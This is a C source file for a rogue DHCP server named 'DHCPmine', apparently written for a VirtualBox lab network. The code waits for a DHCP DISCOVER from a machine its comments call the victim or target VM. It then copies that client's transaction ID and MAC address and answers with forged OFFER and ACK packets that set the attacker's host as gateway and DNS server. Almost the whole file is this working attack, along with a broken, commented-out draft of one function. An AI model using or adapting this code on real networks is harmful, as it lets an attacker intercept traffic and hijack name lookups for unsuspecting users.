#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include "DHCPmine.h"


int debug = 1;


char new_offer_ip[] = "192.168.56.100"; // IP address offered to 
char my_server_ip[] = "192.168.56.1"; // my DHCP server address
char my_gateway[] = "192.168.56.1"; // Default gateway given to 
char my_dns[] = "192.168.56.1"; // DNS server given to 

char fake_dhcp_ip[] = "10.0.2.15";

/*
storage for the DHCP DISCOVER packet.

we need info because 
DHCP offer needs the same transaction ID and correct  MAC address
DHCP request will be checked against this client later
*/

struct dhcp_packet client_packet;


int create_socket(void){
    int sockfd;
    // UDP socket, reused address, send/receive broadcast packets
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);


    if(sockfd < 0){
        perror("socket");
        exit(1);
    }

    int enable = 1;

    // allows multiple processes to bind the same address, for testing
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable,sizeof(enable));
    // broadcast
    setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &enable, sizeof(enable));


    const char *optdev = "vboxnet0"; 
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, optdev, strlen(optdev)) < 0) {
        perror("SO_BINDTODEVICE failed - make sure interface name is correct");
        exit(1);
    }

    struct sockaddr_in addr;
    memset(&addr,0,sizeof(addr));
    addr.sin_family = AF_INET;


    //DHCP server listens on port 67
    addr.sin_port = htons(DHCP_SERVER_PORT);
    // lsiten on all local interfaces
    addr.sin_addr.s_addr = INADDR_ANY;
    // socket to port 67, incoming DHCP broadcasts will arrive here
    if(bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0){
        perror("bind");
        exit(1);
    }

    return sockfd;
}

int receive_discover(int sockfd){
    struct sockaddr_in client;
    socklen_t len = sizeof(client);

    while(1){
        struct dhcp_packet packet;
        memset(&packet,0,sizeof(packet));
        // source address in client
        recvfrom(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&client, &len);

        // 1 = DISCOVER
        if(packet.options[6] != DHCP_DISCOVER)
            continue;

        // ignore marked packets
        if(packet.chaddr[0]==0xAA && packet.chaddr[1]==0xAA){
            continue;
        }


        // vicitm info 
        memcpy(&client_packet, &packet, sizeof(packet));
        if(debug)
            print_packet(packet);
        return 0;
    }

}

// Sends DHCP offer, ip address for my own 
int send_offer(int sockfd){
    struct dhcp_packet offer;
    create_dhcp_reply(&offer,DHCP_OFFER);
    struct sockaddr_in broadcast;

    memset(&broadcast,0,sizeof(broadcast));
    broadcast.sin_family = AF_INET;
    broadcast.sin_port = htons(DHCP_CLIENT_PORT);

    // Broadcast because the client does not have an IP yet
    inet_pton(AF_INET, "192.168.56.255", &broadcast.sin_addr);

    broadcast.sin_addr.s_addr = INADDR_BROADCAST;

    sendto(sockfd, &offer, sizeof(offer), 0, (struct sockaddr *)&broadcast, sizeof(broadcast));

    return 0;
}

int receive_request(int sockfd) {
    struct dhcp_packet request;

    while(1) {
        // Receive the packet
        recvfrom(sockfd, &request, sizeof(request), 0, NULL, NULL);

        // 1. Verify Magic Cookie first to ensure it's a DHCP packet
        if (request.options[0] != 0x63 || request.options[1] != 0x82 ||
            request.options[2] != 0x53 || request.options[3] != 0x63) {
            continue; 
        }

        int message_type = 0;
        unsigned int i = 4; // Start parsing immediately after the 4-byte magic cookie

        // 2. Loop through options dynamically
        // Since request.options is a fixed array, we can use sizeof()
        while (i < sizeof(request.options)) {
            uint8_t opt_code = request.options[i];

            if (opt_code == 255) { // Option 255 means End of Options
                break;
            }
            if (opt_code == 0) { // Option 0 is padding (1 byte long, no length field)
                i++;
                continue;
            }

            // For all other options, the next byte is the length
            uint8_t opt_len = request.options[i + 1];

            // If we found Option 53 (Message Type) and its length is 1 byte
            if (opt_code == 53 && opt_len == 1) {
                message_type = request.options[i + 2]; // Read the value
                break; // We found what we need, exit the loop
            }

            // Jump to the next option: Code (1) + Length (1) + Data (opt_len)
            i += 2 + opt_len;
        }

        // 3. Check if the parsed message type is actually a DHCP_REQUEST
        if (message_type != DHCP_REQUEST) {
            continue;
        }

        // 4. Check MAC address to ensure this request is from our target VM
        if (memcmp(request.chaddr, client_packet.chaddr, 6) == 0) {
            if (debug)
                print_packet(request);
            return 0; // Success!
        }
    }
}

/*


int receive_request(int sockfd){
    struct dhcp_packet request;

    while(1){
        recvfrom(sockfd, &request, sizeof(request), 0, NULL, NULL);


        while (int i=0, i<request.options.length, i++){
            if(request.options[6] != DHCP_REQUEST){
                // check mac and go further ?
            }
        continue;
        }
        
            

    // check mac, if request is for us
        if(memcmp(request.chaddr, client_packet.chaddr, 6)==0){
            if(debug)
                print_packet(request);
            return 0;
        }
    }
}
*/

int send_ack(int sockfd){
    struct dhcp_packet ack;
    create_dhcp_reply(&ack, DHCP_ACK);

    struct sockaddr_in broadcast;
    memset(&broadcast,0,sizeof(broadcast));

    broadcast.sin_family = AF_INET;
    broadcast.sin_port = htons(DHCP_CLIENT_PORT);
    broadcast.sin_addr.s_addr = INADDR_BROADCAST;

    sendto(sockfd, &ack, sizeof(ack), 0, (struct sockaddr *)&broadcast, sizeof(broadcast));


    return 0;
}


/*
creates DHCP offer or ACK packet
DHCP_OFFER = 2
DHCP_ACK   = 5
*/

// https://datatracker.ietf.org/doc/html/rfc2132
void create_dhcp_reply(struct dhcp_packet *packet, int type) {

    memset(packet, 0, sizeof(*packet));

    // Copy transaction info from the client (matches XID, MAC, etc.)
    memcpy(packet, &client_packet, sizeof(*packet));
    packet->op = 2;   // BOOTREPLY

    // Assign IP addresses to the DHCP header
    inet_pton(AF_INET, new_offer_ip, &packet->yiaddr);
    inet_pton(AF_INET, my_server_ip, &packet->siaddr);

    // Clear old options from the copied packet
    memset(packet->options, 0, sizeof(packet->options));

    // DHCP magic cookie
    packet->options[0] = 0x63;
    packet->options[1] = 0x82;
    packet->options[2] = 0x53;
    packet->options[3] = 0x63;

    int opt = 4;
    uint32_t tmp_ip; // Temporary buffer for safe IP conversions

    // 1. DHCP Message Type (MUST BE FIRST)
    packet->options[opt++] = 53;
    packet->options[opt++] = 1;
    packet->options[opt++] = type; // e.g., 2 for DHCPOFFER

    // 2. DHCP Server Identifier
    packet->options[opt++] = 54;
    packet->options[opt++] = 4;
    inet_pton(AF_INET, my_server_ip, &tmp_ip); // Assuming my_server_ip_string is "192.168.x.x"
    memcpy(&packet->options[opt], &tmp_ip, 4);
    opt += 4;

    // 3. Subnet mask
    packet->options[opt++] = 1;
    packet->options[opt++] = 4;
    packet->options[opt++] = 255;
    packet->options[opt++] = 255;
    packet->options[opt++] = 255;
    packet->options[opt++] = 0;

    // 4. Router
    packet->options[opt++] = 3;
    packet->options[opt++] = 4;
    inet_pton(AF_INET, my_gateway, &tmp_ip);
    memcpy(&packet->options[opt], &tmp_ip, 4);
    opt += 4;

    // 5. DNS
    packet->options[opt++] = 6;
    packet->options[opt++] = 4;
    inet_pton(AF_INET, my_dns, &tmp_ip);
    memcpy(&packet->options[opt], &tmp_ip, 4);
    opt += 4;

    // 6. Lease time
    packet->options[opt++] = 51;
    packet->options[opt++] = 4;
    uint32_t lease_time = htonl(86400); // 1 day
    memcpy(&packet->options[opt], &lease_time, 4);
    opt += 4;

    // End Option
    packet->options[opt] = 255;
}

// for debug
void print_packet(const struct dhcp_packet packet){
    printf("\nDHCP PACKET \n");
    printf("OP: %d\n",
           packet.op);
    printf("Hardware type: %d\n",
           packet.htype);
    printf("Hardware length: %d\n",
           packet.hlen);
    printf("Transaction ID: %u\n",
           ntohl(packet.xid));
    printf("IP: %s\n",
        inet_ntoa(packet.yiaddr));
    printf("Client MAC: ");
    for(int i=0;i<packet.hlen;i++)
    {
        printf("%02X ",
               packet.chaddr[i]);
    }
    printf("\n");
    printf("DHCP message type: %d\n",
           packet.options[6]);
    printf("\n");

}




int main(void){
    printf("DHCP server start\n");
    int sockfd = create_socket();
    printf("Waiting for DHCP Discover\n");
    receive_discover(sockfd);
    printf("Sending DHCP Offer\n");
    send_offer(sockfd);
    printf("Waiting for DHCP Request\n");
    receive_request(sockfd);
    printf("Sending DHCP ACK\n");
    send_ack(sockfd);
    close(sockfd);

    return 0;
}